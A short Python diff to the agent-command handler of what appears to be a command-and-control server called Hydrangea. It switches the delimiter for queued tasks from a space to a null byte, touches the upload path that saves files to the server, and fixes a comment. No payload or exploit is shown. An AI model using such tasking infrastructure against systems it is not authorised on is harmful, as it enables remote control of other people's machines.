@@ -46,7 +46,7 @@ def handleAgentCommand(db: HydrangeaDatabase, socketClient: SocketCustom, client
                 socketClient.sendall(b"ERROR: Invalid input")
             else:
                 task: str = base64Decode(userInputSplit[2])
-                taskSplit = task.split(" ")
+                taskSplit = task.split("\x00")
                 taskType = taskSplit[0]
 
                 # Intervention - pre-process specific Task types
@@ -65,12 +65,12 @@ def handleAgentCommand(db: HydrangeaDatabase, socketClient: SocketCustom, client
                     else:
                         filename = generateRandomStr(7)
 
-                    # Write file on server, then store pathname to it in data..
+                    # Write file on server, then store pathname to it in database
                     pathToSaveHereOnServer = os.path.join(os.getcwd(), "uploads", filename)
                     with open(pathToSaveHereOnServer, "wb") as fileToSave:
                         fileToSave.write(base64Decode(taskSplit[1], outputString=False))
                     taskSplit[1] = pathToSaveHereOnServer
-                    task = " ".join(taskSplit)
+                    task = "\x00".join(taskSplit)
 
                 # Log task
                 print(userInputSplit[1], clientId, task)
